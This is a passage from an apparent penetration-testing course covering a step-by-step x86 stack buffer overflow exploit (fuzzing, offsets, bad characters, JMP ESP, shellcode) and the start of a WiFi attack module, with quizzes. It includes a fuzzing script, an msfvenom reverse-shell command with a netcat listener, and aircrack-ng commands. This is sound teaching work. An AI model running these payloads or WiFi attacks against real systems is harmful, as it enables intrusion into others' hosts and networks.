   - The compiler automatically truncates any input longer than the buffer
   - RAM is volatile, so excess bytes are silently discarded
   > strcpy()/gets() write with no bounds checking, so bytes past the buffer's declared size overflow into adjacent stack memory.
2. In the typical x86 frame layout [buffer][other locals][saved EBP][return address], what gets overwritten last as an overflow grows, and why does that matter most?
   - **The saved return address, because that value is what the CPU jumps to when the function returns** ✓
   - The function's arguments, because they execute before the return address is read
   - The saved EBP only, since the return address sits below it and is unreachable
   - The buffer itself, which resets automatically once overflowed
   > The return address is overwritten last as the overflow grows, and since it's what the CPU jumps to on return, controlling it means controlling execution flow.
3. Why is this technique specifically called a 'stack-based' buffer overflow?
   - It only works on programs that explicitly use a stack data structure in their source code
   - It overflows the CPU's internal instruction stack rather than memory
   - **The overwritten data, including eventually the return address, all lives on the stack, as opposed to heap-based corruption** ✓
   - It targets the heap allocator's internal call stack
   > The corrupted data - locals, saved EBP, and return address - all resides on the stack, distinguishing it from heap-based memory corruption.

#### 177. Fuzzing to Find the Crash `[theory]` — Week 15

Before any exploit can be built, you first have to find where the program breaks. Fuzzing a network service (or any input-taking binary) means sending progressively larger blocks of junk data — often a repeating character like 'A' — until the target crashes, narrowing down roughly how much input it takes to hit the vulnerable buffer. A typical fuzzing script opens a socket, sends the target command followed by an increasing string of 'A' characters (e.g. 100, then 200, then 300 bytes, in a loop with a short delay between attempts), and checks after each send whether the service stops responding or an attached debugger reports an access violation. Once the service crashes, the debugger's register view is checked — if EIP has been overwritten with 0x41414141 ('AAAA' in hex), that confirms the crash reached and corrupted the return address, and roughly bounds the offset (e.g. 'somewhere between 300 and 400 bytes'). This step is deliberately coarse: it answers 'does this crash, and roughly how much input does it take,' not the exact byte count. You finish able to write a basic fuzzing loop against a listening service, recognize an EIP overwrite of 0x41414141 in a debugger, and explain why fuzzing only narrows the range rather than pinpointing the exact offset.

**Key Points:**

- Fuzzing's purpose is narrowing down roughly where a crash occurs, not finding an exact offset
- Send incrementing buffer sizes (e.g. +100 bytes per iteration) in a loop with a delay, watching for the service to stop responding
- Requires an attached debugger (e.g. Immunity Debugger) on the target to observe registers at the moment of the crash
- EIP == 0x41414141 ('AAAA') confirms the overflow reached and overwrote the saved return address
- Fuzzing output is a rough range (e.g. 300-400 bytes) that the next step narrows to an exact offset

```bash
import socket, time
buffer = "A" * 100
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("TARGET_IP", 9999))
    s.send(bytes(buffer, "latin-1"))
    buffer += "A" * 100
    time.sleep(1)
```

**Quick Quiz:**

1. When a fuzzed service crashes with EIP reading exactly 0x41414141, what has actually been confirmed?
   - The exact byte offset needed for the final exploit buffer
   - That the target has no bad characters anywhere in its input handling
   - **That the overflow reached and overwrote the saved return address, within only a rough size range** ✓
   - That DEP and ASLR are both disabled on the target
   > EIP == 0x41414141 confirms the return address was overwritten, but fuzzing only narrows the crash to a rough range, not an exact offset.
2. Why does the fuzzing step require an attached debugger like Immunity Debugger on the target?
   - To automatically calculate the exact offset for the exploit
   - **To observe register state, such as EIP, at the moment the service crashes** ✓
   - To generate the final shellcode payload
   - To bypass ASLR during the fuzzing run
   > Without an attached debugger there is no way to see whether or how the crash corrupted registers like EIP.
3. Fuzzing narrows a crash to somewhere between 300 and 400 injected bytes. What is the correct next step, based on how this methodology is described?
   - Assume 350 bytes is close enough and send the final exploit buffer
   - Run msfvenom immediately to generate shellcode for that range
   - **Use a cyclic pattern to resolve the exact offset within that range, since fuzzing output is deliberately coarse** ✓
   - Begin bad character analysis using the 300-400 byte range as the offset
   > Fuzzing only produces a rough range; the next step is generating a cyclic pattern to pinpoint the exact offset.

#### 178. Finding the Exact Offset (Cyclic / De Bruijn Pattern) `[theory]` — Week 15

Fuzzing only proves a crash lands somewhere in a few-hundred-byte range — finding the precise offset needs a pattern where every 4-byte window is unique, so that whatever bytes end up in EIP can be looked up to reveal exactly how far into the input they sit. This is a De Bruijn sequence, and Metasploit ships tools that generate and read it: pattern_create.rb (or the newer msf-pattern_create wrapper) builds a non-repeating pattern of a given length, sent in place of the fuzzer's repeated 'A's. When the target crashes, EIP no longer contains 0x41414141 — it contains four bytes lifted directly from a specific spot in that pattern (e.g. 0x386F4337). Feeding that value back into pattern_offset.rb (or msf-pattern_offset) looks it up against the original pattern and returns the exact byte offset — for example, 'exact match at offset 524' — meaning bytes 0 through 523 of the input are padding, and bytes 524 through 527 land precisely in the saved return address. This precision is what makes the rest of the exploit deterministic instead of guesswork. You finish able to generate a cyclic pattern, read an EIP value out of a crashed debugger, and resolve it to an exact offset with pattern_offset.rb.

**Key Points:**

- Fuzzing gives a range; a cyclic (De Bruijn) pattern gives the exact offset because every window of bytes in it is unique
- pattern_create.rb / msf-pattern_create generates a non-repeating pattern of a chosen length to send instead of repeated 'A's
- After the crash, EIP holds 4 bytes lifted directly from a specific spot in the pattern (e.g. 0x386F4337), not 0x41414141
- pattern_offset.rb / msf-pattern_offset looks that value up against the original pattern and returns the exact offset
- Offset result means: that many bytes of padding come before the 4 bytes that land in the saved return address

```bash
msf-pattern_create -l 400
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
msf-pattern_offset -l 400 -q 386F4337
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 400 -q 386F4337
```

**Quick Quiz:**

1. Why can a cyclic (De Bruijn) pattern reveal an exact offset where a string of repeated 'A' characters cannot?
   - It is always shorter than an equivalent string of 'A's
   - It disables ASLR for the duration of the crash
   - **Every 4-byte window within the pattern is unique, so whatever ends up in EIP can be looked up to reveal exactly where it came from** ✓
   - It always produces a pattern exactly 524 bytes long
   > Because every window in a De Bruijn pattern is unique, the 4 bytes captured in EIP map to one specific position, giving an exact offset.
2. After sending a cyclic pattern, EIP now contains 0x386F4337 instead of 0x41414141. What does this indicate?
   - The exploit has already achieved code execution
   - The target has bad characters at that specific offset
   - The buffer length was miscalculated and the whole process must restart from fuzzing
   - **Those 4 bytes were lifted directly from an identifiable spot in the pattern, which pattern_offset.rb can resolve to an exact offset** ✓
   > A pattern-derived value in EIP (rather than 0x41414141) means the crash landed inside the unique cyclic pattern, letting pattern_offset.rb pinpoint the offset.
3. pattern_offset.rb reports 'exact match at offset 524.' What does this mean for building the exploit buffer?
   - Exactly 524 bytes total are needed for the whole exploit, no more
   - **Bytes 0 through 523 are padding, and bytes 524 through 527 land precisely in the saved return address** ✓
   - The shellcode itself must begin at byte 524
   - The bad-character exclusion list contains 524 entries
   > An offset of 524 means 524 bytes of padding precede the 4 bytes that overwrite the saved return address.

#### 179. Controlling EIP `[theory]` — Week 15

Knowing the exact offset is only useful if you can prove it actually gives you control — the confirmation step is to rebuild the input as [offset bytes of padding] + [4 bytes of a chosen marker, e.g. 'BBBB' / 0x42424242] + [remaining junk to preserve overall length], send it, and check the debugger again. If EIP now reads exactly 0x42424242, that's proof the offset was correct and that whatever 4 bytes are placed at that position become the next value the CPU tries to execute from. This is also the point where the rest of the buffer — everything after the 4-byte EIP overwrite — is confirmed to still be present and usable, typically by placing a third marker like a block of 'C's after the EIP bytes and checking that it appears intact on the stack, usually pointed to by ESP at the moment of the crash. That surviving space after the overwrite is what will eventually hold the actual shellcode. You finish able to construct a padding+marker+marker exploit buffer, confirm exact EIP control in a debugger, and identify where in memory (relative to ESP) the space for shellcode will sit.

**Key Points:**

- Rebuild the buffer as offset padding + a distinct 4-byte marker (e.g. 'BBBB' / 0x42424242) + trailing filler
- EIP reading exactly the marker value after the crash proves the offset from the previous step was correct
- A third marker (e.g. a block of 'C's) placed after the EIP bytes confirms the remaining buffer survives intact past the overwrite
- ESP at the moment of the crash typically points into that surviving space — where shellcode will eventually be placed
- This step turns 'we found an offset' into 'we proved we control execution flow'

**Quick Quiz:**

1. Why is a distinct marker like 'BBBB' sent at this stage instead of jumping straight to shellcode?
   - 'BBBB' is required syntax that msfvenom expects in every payload
   - Shellcode cannot be sent until DEP is confirmed disabled
   - EIP can only ever hold printable ASCII values
   - **To confirm the offset from the previous step is exactly right by checking that EIP reads precisely 0x42424242** ✓
   > Seeing EIP overwritten with exactly the chosen marker value proves the offset is correct before building anything further on top of it.
2. What does placing a block of 'C' characters immediately after the EIP-overwriting marker verify?
   - That the target is specifically running Immunity Debugger
   - That the offset calculated earlier was actually wrong
   - **That the remaining part of the buffer survives intact past the overwrite, confirming usable space for shellcode later** ✓
   - That ASLR is disabled on the target module
   > The third marker confirms that bytes after the EIP overwrite are not lost or corrupted, meaning that space can later hold shellcode.
3. Why does it matter where ESP points at the exact moment of the crash?
   - ESP determines which bytes are treated as bad characters
   - ESP must be numerically equal to EIP for the exploit to succeed
   - ESP always points back to the original, unmodified return address
   - **ESP typically points into the attacker-controlled buffer space that will eventually hold the shellcode** ✓
   > ESP at crash time usually points into the surviving part of the buffer, which is why a JMP ESP redirect lands execution in the shellcode.

#### 180. Bad Character Analysis `[theory]` — Week 15

Not every byte value survives being passed through a real application unmolested — null bytes routinely terminate C strings early, and other bytes get filtered, translated, or stripped by input handling, encoding, or protocol parsing along the way. Since the exploit buffer (and eventually shellcode) has to survive that trip intact, every byte from 0x00 to 0xFF is sent through the vulnerable input as one continuous block, immediately after the EIP-control marker, and the memory region it lands in is compared byte-for-byte against the original in the debugger. Bytes that appear unchanged are safe to use; bytes that are missing, reordered, or altered are 'bad characters' and must be excluded from every later payload. 0x00 is almost always a bad character because it terminates C strings; beyond that, common culprits are 0x0a (line feed) and 0x0d (carriage return) in text-based protocols, but the only reliable way to know the full list for a specific target is to test the entire range and compare. Because one bad byte can corrupt everything after it in the buffer — hiding whether later bytes are also bad — this test is normally repeated iteratively: remove confirmed-bad bytes and resend the rest until the full remaining range compares clean. You finish able to build and send a full 0x00-0xFF byte-range payload, compare it byte-by-byte against what the target's memory holds, and produce an accurate bad-character exclusion list for a given target.

**Key Points:**

- Send the full byte range 0x00-0xFF as one block, immediately after the EIP marker
- Compare the sent bytes against what actually appears in the target's memory: unchanged = safe, missing/altered = 'bad character'
- 0x00 is almost always bad because it terminates C strings
- 0x0a (line feed) and 0x0d (carriage return) are commonly bad in text-based protocols
- A single bad byte can corrupt everything after it in the buffer, so the test is repeated iteratively after removing confirmed-bad bytes
- The final exclusion list (e.g. \x00\x0a\x0d) feeds directly into shellcode generation later

```bash
!mona bytearray -cpb "\x00"
!mona compare -f C:\mona\bytearray.bin -a <ESP_ADDRESS>
```

**Quick Quiz:**

1. Why is bad character testing repeated iteratively, removing confirmed-bad bytes and resending the rest, rather than done in a single pass?
   - mona.py can only test 16 bytes of the range at a time
   - **A single bad byte can corrupt everything after it in the buffer, hiding whether later bytes are also bad** ✓
   - The debugger resets its memory view after every test
   - ASLR changes which byte values are bad on each run
   > Because one bad byte can corrupt the bytes that follow it in memory, the test must be repeated after removing known-bad bytes to get an accurate full list.
2. Why is 0x00 almost always treated as a bad character in this kind of exploit?
   - It is the first byte of every JMP ESP instruction
   - It always matches the chosen EIP marker value
   - msfvenom refuses to generate any payload containing it
   - **It terminates C strings, so anything after it in the buffer gets cut off** ✓
   > 0x00 is a null terminator in C strings, so it truncates the buffer at that point and corrupts everything meant to follow it.
3. How is a specific byte value actually determined to be 'bad' during this analysis?
   - By checking whether the byte alone crashes the fuzzer
   - By checking whether the byte is printable ASCII
   - **By comparing the bytes that were sent against what actually appears in the target's memory - missing or altered bytes are bad** ✓
   - By checking whether msfvenom's default payload happens to include it
   > Bad characters are identified by a byte-for-byte comparison between the sent 0x00-0xFF block and what actually shows up in target memory.

#### 181. Finding a JMP ESP (and Why ASLR/DEP Change Everything) `[theory]` — Week 15

Controlling EIP only gets execution to jump to a 4-byte address you chose — it doesn't by itself get you into your shellcode, because you rarely know in advance the exact stack address your shellcode will land at. The classic workaround is to point EIP at an instruction that's already sitting in memory and does the redirecting for you: a JMP ESP instruction, which tells the CPU to jump to whatever address ESP currently holds — and since ESP at the moment of the crash points right into the attacker-controlled buffer, jumping there lands execution directly in the shellcode without needing to know its absolute address. Tools like mona.py automate the search, scanning loaded modules for that opcode sequence while excluding any candidate address that itself contains a byte from the bad-character list, since the address becomes part of the buffer. This entire technique depends on the module supplying that JMP ESP being loaded at a fixed, predictable address — which is precisely what ASLR (Address Space Layout Randomization) exists to prevent, by randomizing module base addresses on every run so a hardcoded JMP ESP address is no longer reliable. DEP (Data Execution Prevention) attacks the other assumption, marking the stack non-executable so that even landing on shellcode there fails to run it — modern exploit development gets around DEP with return-oriented programming (ROP) rather than a plain JMP ESP. You finish able to explain why a usable JMP ESP address must come from a non-ASLR module, locate one with mona.py, and describe at a conceptual level why ASLR and DEP defeat this specific technique on a modern, fully-protected target.

**Key Points:**

- EIP control alone isn't shellcode execution — you need a reliable pivot into the buffer without knowing its absolute address
- JMP ESP jumps to whatever ESP currently holds, which points into the attacker-controlled buffer at crash time
- mona.py automates the search and can exclude candidate addresses that contain a bad-character byte
- The chosen address must sit in a module that loads at the same base address every run — no ASLR, no rebasing
- ASLR randomizes module base addresses per run, breaking a hardcoded JMP ESP address
- DEP marks stack memory non-executable, so even a successful jump onto the stack fails to execute shellcode there — modern bypasses use ROP instead
- This is why classic stack BOF technique like this one targets older or explicitly unprotected binaries in training labs, not hardened modern software

```bash
!mona jmp -r esp -cpb "\x00\x0a\x0d"
!mona modules
```

**Quick Quiz:**

1. Why doesn't controlling EIP alone guarantee execution lands in your shellcode?
   - EIP can only be overwritten with NOP instructions
   - **You typically don't know the shellcode's exact absolute stack address in advance, so EIP needs a reliable pivot like JMP ESP instead** ✓
   - Shellcode must be encoded directly inside the EIP value itself
   - Any EIP overwrite automatically triggers DEP
   > Without knowing the shellcode's absolute address, EIP is pointed at a JMP ESP instruction instead, which reliably redirects to wherever ESP is at that moment.
2. Why must the module supplying the JMP ESP address load at the same, predictable base address on every run?
   - **ASLR randomizes a module's base address per run, so a hardcoded address from an ASLR-enabled module won't work reliably again** ✓
   - Non-ASLR modules automatically also disable DEP
   - JMP ESP instructions only exist inside non-ASLR modules
   - A predictable base address changes which bytes are bad characters
   > ASLR randomizes module base addresses on each run, so a JMP ESP address hardcoded from an ASLR-enabled module would no longer point to the same instruction next time.
3. Even with a correct JMP ESP address, why does DEP defeat this specific technique?
   - DEP removes the JMP ESP instruction from memory entirely
   - DEP randomizes EIP on every function call
   - DEP requires the exploit to have a working ROP chain before finding bad characters
   - **DEP marks the stack memory non-executable, so even a successful jump onto the shellcode there fails to run it** ✓
   > DEP prevents code on the stack from executing at all, so landing on shellcode there via JMP ESP no longer results in execution - modern bypasses use ROP instead.

#### 182. Generating & Placing Shellcode (msfvenom, NOP Sled) `[theory]` — Week 15

With an exact offset, a reliable JMP ESP address, and a known bad-character list all in hand, the exploit buffer's final shape is: [padding to offset] + [JMP ESP address, little-endian] + [NOP sled] + [shellcode]. msfvenom generates the payload itself, and the bad-character list from earlier is passed straight in as an exclusion so the generated shellcode never contains a byte that would corrupt it in transit — for example, msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -b '\x00\x0a\x0d' -f c produces C-formatted shellcode guaranteed free of those three bytes. A short NOP sled — a run of 0x90 'no operation' bytes — is placed immediately before the shellcode as landing-zone tolerance: JMP ESP lands execution at ESP, but the exact byte alignment can be off slightly depending on the target, and sliding down through NOPs until hitting the real shellcode is far more forgiving than needing to land on byte zero exactly. The finished payload is sent to the vulnerable input while a listener (e.g. nc -lvnp 4444, or a Metasploit multi/handler configured for the same payload) waits for the resulting reverse shell connection. You finish able to generate bad-character-free shellcode with msfvenom for a chosen payload, explain what a NOP sled buys you and why, and assemble the final padding+address+NOPs+shellcode buffer end to end.

**Key Points:**

- Final buffer order: padding to offset -> JMP ESP address (little-endian) -> NOP sled -> shellcode
- msfvenom -p <payload> LHOST=<ip> LPORT=<port> -b '<bad chars>' -f <format> generates shellcode excluding confirmed bad characters
- A NOP sled (0x90 bytes) before the shellcode gives landing-zone tolerance so a slightly imprecise jump still slides into the payload
- A matching listener (nc for a reverse shell, or Metasploit's multi/handler) must be running before the exploit is sent
- The return address bytes must be placed in little-endian order to match how x86 reads them off the stack

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -b '\x00\x0a\x0d' -f c
nc -lvnp 4444
```

**Quick Quiz:**

1. Why is a NOP sled placed immediately before the shellcode rather than relying on JMP ESP to land exactly on its first byte?
   - NOP sleds exempt the shellcode from bad-character restrictions
   - msfvenom will not compile shellcode without a NOP sled present
   - **The jump's exact landing point can be slightly imprecise, and sliding through NOPs is far more forgiving than needing byte-exact alignment** ✓
   - NOP sleds disable ASLR for the remainder of the exploit
   > A NOP sled gives landing-zone tolerance, since JMP ESP may not land on the exact first byte of shellcode every time.
2. Why is the bad-character list from earlier passed into msfvenom's -b flag when generating shellcode?
   - So the generated shellcode automatically bypasses DEP
   - So the payload shrinks to fit under the discovered offset
   - So ASLR is disabled specifically during payload generation
   - **So the generated shellcode never contains a byte that would corrupt it in transit through the vulnerable input** ✓
   > Excluding known bad characters ensures the shellcode itself won't be truncated or altered by the same filtering that affected earlier test bytes.
3. Why must the JMP ESP return address bytes be arranged in little-endian order within the exploit buffer?
   - To avoid accidentally including the bad character 0x00
   - **To match how x86 reads multi-byte values off the stack** ✓
   - So the address fits entirely inside the NOP sled
   - Because msfvenom only accepts little-endian shellcode as input
   > x86 reads addresses off the stack in little-endian order, so the return-address bytes must be arranged that way to be interpreted correctly.

#### 183. The Full Exploit Chain, End to End `[theory]` — Week 15

Every stage of this methodology only matters in service of the next, and seeing them chained together end to end is what makes the whole process click rather than feeling like a list of disconnected debugger tricks. The chain runs: fuzz to find an approximate crash range, generate a cyclic pattern to resolve that range to an exact offset, rebuild the buffer with a marker to prove exact EIP control, send the full 0x00-0xFF byte range to identify bad characters, search loaded non-ASLR modules for a JMP ESP instruction free of those bad characters, and finally generate bad-character-free shellcode with msfvenom, wrap it in a NOP sled, and assemble the complete buffer as padding + JMP ESP address + NOP sled + shellcode. Skipping or getting any single link wrong breaks the whole chain: a wrong offset misplaces the return-address overwrite, an unaccounted bad character corrupts the shellcode or the address bytes in transit, and a JMP ESP address pulled from an ASLR-enabled module works in the debugger session that found it but not on the next reboot. This exact methodology is what corelan.be's long-running Exploit Writing Tutorials series walks through in far greater depth, and it remains a foundational teaching tool for exploit development even as ASLR, DEP, and stack canaries have made it far less viable, unmodified, against current, fully-patched software in the wild. You finish able to narrate the complete offset -> EIP control -> bad chars -> JMP ESP -> shellcode chain from memory, explain why each step depends on the one before it, and identify which modern mitigation defeats which specific step.

**Key Points:**

- Full chain: fuzz -> cyclic pattern for exact offset -> confirm EIP control -> bad character analysis -> find a bad-char-free JMP ESP in a non-ASLR module -> generate shellcode with msfvenom + NOP sled -> deliver the buffer
- Each step's output is a required input to the next; an error early (e.g. a wrong offset) invalidates everything downstream
- corelan.be's Exploit Writing Tutorials are the canonical, long-running public reference for this exact methodology
- Modern mitigations map to specific steps: ASLR breaks a hardcoded JMP ESP address, DEP blocks executing the stack at all, stack canaries can detect the overwrite before the corrupted return address is even used
- The technique remains foundational training precisely because it makes memory corruption concrete, even though it rarely works unmodified against current, fully-protected real-world software

```bash
buffer = b"A" * offset
buffer += struct.pack("<I", jmp_esp_address)
buffer += b"\x90" * 16
buffer += shellcode
```

**Quick Quiz:**

1. What is the correct order of this module's exploit development methodology?
   - **Fuzz -> cyclic pattern for exact offset -> confirm EIP control -> bad character analysis -> find a JMP ESP -> generate shellcode with NOP sled -> deliver buffer** ✓
   - Bad character analysis -> fuzz -> find JMP ESP -> confirm EIP control -> generate shellcode -> cyclic pattern for offset
   - Generate shellcode -> fuzz -> find JMP ESP -> confirm EIP control -> cyclic pattern for offset -> bad character analysis
   - Find JMP ESP -> fuzz -> generate shellcode -> confirm EIP control -> cyclic pattern for offset -> bad character analysis
   > The methodology runs fuzz, then exact offset via cyclic pattern, then confirmed EIP control, then bad characters, then JMP ESP, then shellcode delivery.
2. Which mitigation specifically defeats the JMP ESP step, rather than blocking shellcode execution outright?
   - Stack canaries
   - DEP
   - **ASLR, because it randomizes module base addresses so a hardcoded JMP ESP address is no longer reliable** ✓
   - Bad character filtering
   > ASLR breaks the JMP ESP step by randomizing the base address of the module the address was found in, while DEP is what blocks execution on the stack itself.
3. Why does an early mistake, such as a wrong offset, invalidate the entire exploit chain rather than just that one step?
   - msfvenom automatically detects and corrects upstream mistakes
   - **Each step's output is a required input to the next, so an error early on breaks everything built downstream** ✓
   - The debugger resets the bad-character list whenever an error occurs
   - DEP only activates specifically when the offset is wrong
   > Because each stage feeds directly into the next (offset into EIP control, bad chars into shellcode generation, and so on), an early error propagates through the whole chain.


---

## M19: Wireless Security

**Month 4** · Week 15 · 7 topics

Wireless networks broadcast their traffic through open air, which means every attack in this module starts with capturing frames instead of touching a wire — but attacking WiFi always means attacking a real access point and its real connected clients, so it only ever happens within a scope you are explicitly authorized to test, using an adapter capable of monitor mode and packet injection. This module walks the standard aircrack-ng suite methodology end to end: 802.11 fundamentals, why WEP failed, how the WPA/WPA2 4-way handshake actually works, capturing that handshake, cracking it offline as a dictionary-coverage problem, and the separate WPS PIN and Evil Twin attack paths that target different weak points around the same network.

**Learning Outcomes:**

- Explain 802.11 monitor vs managed mode and why packet injection capability gates every active WiFi attack
- Describe why WEP's IV reuse made it trivially breakable and how WPA/WPA2 replaced that design
- Trace how the WPA/WPA2 4-way handshake derives the PTK from the PMK and two nonces, and why capturing it — not breaking it — is the actual prerequisite for cracking
- Run the airmon-ng / airodump-ng / aireplay-ng workflow to capture a handshake, then crack it offline with aircrack-ng or hashcat
- Explain why WPS PIN attacks (reaver/bully) and Evil Twin/captive-portal attacks are separate techniques from handshake cracking, each targeting a different weakness

**Module Resources:**

- [Aircrack-ng Official Docs](https://www.aircrack-ng.org) _(tool)_
- [Aircrack-ng (GitHub)](https://github.com/aircrack-ng/aircrack-ng) _(link)_
- [hashcat](https://hashcat.net) _(tool)_

**Module Quiz (9 questions):**

1. What is the essential difference between managed mode and monitor mode?
   - **Monitor mode passively captures all 802.11 frames on a channel regardless of destination/association, while managed mode only processes frames addressed to it after associating** ✓
   - Managed mode captures more traffic than monitor mode
   - There is no real difference; the terms are interchangeable
   - Monitor mode only works with WPA3 networks
   > Monitor mode strips the destination/association filtering that managed mode applies, capturing every frame on the channel.
2. Why is WEP considered broken by design rather than merely misconfigured?
   - Because its passphrases are always shorter than WPA2's
   - **Because its small 24-bit IV space reuses quickly, leaking the RC4 keystream and allowing statistical key recovery with no brute force needed** ✓
   - Because it requires physical access to the router
   - Because it was never actually deployed in real networks
   > WEP's tiny IV space forces frequent reuse, leaking the RC4 keystream and enabling statistical key recovery regardless of configuration.
3. In the WPA/WPA2 4-way handshake, what is actually transmitted over the air, and what never is?
   - The PMK is transmitted; the nonces never are
   - The passphrase is transmitted in Message 3
   - **Nonces (ANonce/SNonce) and a MIC are exchanged; the PMK itself is never transmitted** ✓
   - Nothing is transmitted — the handshake is purely computed locally
   > The handshake exchanges nonces and a MIC over the air, but the PMK itself never leaves either device.
4. What does aireplay-ng's deauthentication attack achieve in a handshake-capture workflow?
   - It cracks the passphrase without needing a wordlist
   - It permanently blocks the client from ever reconnecting
   - It converts a .cap file into hashcat format
   - **It forces an already-connected client to disconnect and reassociate, regenerating the 4-way handshake for capture** ✓
   > Spoofed deauth frames force a connected client to reassociate, regenerating the handshake so it can be captured.
5. What is the actual bottleneck in cracking a captured WPA2 handshake offline?
   - **Wordlist coverage — if the real passphrase isn't in the list, no amount of compute power will find it** ✓
   - The number of deauth packets sent
   - The AP's firmware version
   - The strength of the ESSID name
   > Offline cracking is a dictionary-coverage problem: without the real passphrase in the wordlist, no compute power will recover it.
6. How does hashcat mode 22000 relate to mode 2500?
   - 2500 replaced 22000 as the newer mode
   - They target WEP cracking exclusively
   - **22000 is the current unified mode for WPA-PBKDF2-PMKID+EAPOL, superseding the older EAPOL-only mode 2500** ✓
   - Mode numbers are arbitrary and interchangeable
   > Mode 22000 unified WPA handshake and PMKID-based cracking, superseding the older EAPOL-only mode 2500.
7. Why does a WPS PIN attack succeed far faster than a true 8-digit brute force would suggest?
   - Because WPS PINs are never actually 8 digits
   - **Because many APs validate the PIN in two independently-acknowledged halves, collapsing the real search space to about 10^4 + 10^3 guesses** ✓
   - Because the PIN is sent in plaintext in beacon frames
   - Because reaver disables the AP's power supply
   > Split validation of the PIN's two halves collapses the true 10^7 keyspace to roughly 10^4 + 10^3 feasible guesses.
8. What fundamentally distinguishes an Evil Twin attack from every handshake- or PIN-based attack in this module?
   - It requires GPU acceleration that the others do not
   - **It targets human trust and deception via a captive portal, producing no handshake to crack and involving no WPS PIN math** ✓
   - It only works against WEP networks
   - It requires physical access to the router's Ethernet port
   > Evil Twin attacks deceive the victim into handing over credentials via a captive portal, with no cryptographic cracking involved at all.
9. Why is a dedicated USB WiFi adapter standard kit for these attacks rather than a laptop's built-in card?
   - Built-in cards cannot enter monitor mode under any circumstances
   - USB adapters are required by the aircrack-ng license
   - **Packet injection capability is chipset/driver-dependent, and most built-in laptop WiFi adapters cannot inject packets** ✓
   - Built-in cards cannot connect to 2.4GHz networks
   > Packet injection is gated by chipset and driver support, which most built-in laptop cards lack, making a known-compatible USB adapter standard kit.

### Topics

#### 176. 802.11 Wireless Fundamentals — Monitor Mode, Beacons, BSSID/ESSID `[theory]` — Week 15

Before you can attack a WiFi network you have to be able to see all of it, and by default your adapter can't — a normal WiFi card in managed mode only processes frames addressed to it and only after associating with one network. Monitor mode strips that filtering away: the adapter passively listens to every 802.11 frame in the air on a given channel, associated or not, which is what lets tools like airodump-ng show you every AP and client nearby before you've touched any of them. Access points constantly announce themselves with beacon frames — small broadcasts sent roughly ten times a second advertising the network's ESSID (the human-readable name, e.g. 'HomeNetwork-5G'), its BSSID (the AP radio's actual MAC address, the real unique identifier since two APs can share an ESSID), the channel it operates on, and its supported security (WEP/WPA/WPA2/WPA3, encryption suites). Everything downstream in this module — capturing a handshake, sending deauths, cracking a passphrase — depends on first getting an adapter into monitor mode on a chipset that also supports packet injection (transmitting arbitrary crafted frames, not just receiving), which most built-in laptop WiFi cards do not support; hunters typically carry a dedicated USB adapter with a known-compatible chipset and Linux driver, and none of this is legal or appropriate to run against a network without explicit authorization to test it. You finish able to explain the difference between managed and monitor mode, read a beacon frame's ESSID/BSSID/channel from an airodump-ng scan, and identify why hardware capability is the actual gate on whether any of these attacks are even possible on your machine.

**Key Points:**

- Managed mode: the NIC only processes frames addressed to its own MAC and only after associating with a single AP; monitor mode: the NIC passively captures all 802.11 frames on a channel regardless of destination or association
- Beacon frames are broadcast roughly 10x/sec by an AP, carrying the ESSID (network name), BSSID (the AP radio's real MAC, the true unique identifier since ESSID can be duplicated), channel, and supported auth/encryption suites
- BSSID vs ESSID: BSSID identifies one specific radio; ESSID is the shared name multiple BSSIDs (e.g. mesh access points) can advertise simultaneously
- Monitor mode alone is enough to passively observe traffic; forcing new traffic (deauth, handshake capture) additionally requires packet injection support
- Packet injection capability is chipset/driver-dependent — most built-in laptop WiFi adapters cannot inject, which is why a dedicated USB adapter with a known-compatible chipset is standard kit
- Every technique in this module is an active attack against a network's real AP and clients, and is only appropriate within a scope you are explicitly authorized to test
- airmon-ng is the aircrack-ng suite tool used to switch an adapter between managed and monitor mode

```bash
iwconfig
airmon-ng check
airmon-ng start wlan0
```

**Quick Quiz:**

1. What is the key difference between managed mode and monitor mode for a WiFi adapter?
   - Managed mode requires a paid driver license; monitor mode does not
   - **Managed mode only processes frames addressed to it after associating with one network; monitor mode passively captures all 802.11 frames on a channel regardless of destination or association** ✓
   - Monitor mode only works on 5GHz bands while managed mode works on both
   - Monitor mode encrypts captured frames automatically for later analysis
   > Managed mode filters to frames addressed to the associated network, while monitor mode strips that filtering away and captures everything on the channel.
2. What distinguishes a BSSID from an ESSID?
   - ESSID is the AP radio's actual MAC address; BSSID is the human-readable network name
   - They are two names for exactly the same value
   - **BSSID is the AP radio's actual MAC address and the true unique identifier; ESSID is the human-readable network name that multiple BSSIDs (e.g. mesh APs) can share** ✓
   - BSSID changes every time a beacon frame is sent
   > BSSID uniquely identifies one specific radio's MAC address, while ESSID is the shared human-readable name that several BSSIDs can advertise at once.
3. Beyond monitor mode, what additional adapter capability is required to send deauthentication frames and actively force a handshake?
   - A higher transmit power setting only
   - **Packet injection, a chipset/driver-dependent capability most built-in laptop WiFi cards lack, which is why a dedicated USB adapter is standard kit** ✓
   - A 5GHz-only radio
   - Root access to the access point itself
   > Forcing new traffic like deauths requires packet injection support, which is gated by chipset/driver and absent from most built-in laptop cards.

#### 177. WEP's Fundamental Weakness — Why It Was Replaced `[theory]` — Week 15

WEP (Wired Equivalent Privacy) was the original 802.11 encryption scheme, and it's covered here only long enough to explain why it was replaced: WEP encrypts each frame with RC4 keyed on a fixed shared key plus a 24-bit Initialization Vector (IV) that's sent in the clear alongside the frame. Because the IV space is small and reused constantly on a busy network, an attacker who passively collects enough IV-carrying packets can recover the RC4 keystream statistically and derive the WEP key entirely offline — no brute force, no dictionary, just enough captured traffic. This is a protocol-design flaw, not an implementation bug, which is why WEP is considered broken today and was formally replaced by WPA and then WPA2, both of which discard WEP's static-key-plus-short-IV scheme entirely in favor of a per-session key derived through a proper handshake. You finish able to state in one sentence why WEP is crackable (IV reuse breaking RC4 keystream secrecy) and why that specific flaw doesn't carry over to WPA/WPA2.

**Key Points:**

- WEP encrypts frames with RC4 keyed on a static shared key plus a 24-bit IV transmitted unencrypted in every frame
- The IV space (2^24) is small enough that IVs repeat quickly on an active network, and IV reuse leaks information about the RC4 keystream
- Collecting enough IV-carrying packets lets the keystream be recovered statistically, exposing the WEP key without brute force or a wordlist
- This is a fundamental weakness in WEP's design, not a misconfiguration — no amount of 'using WEP correctly' fixes it
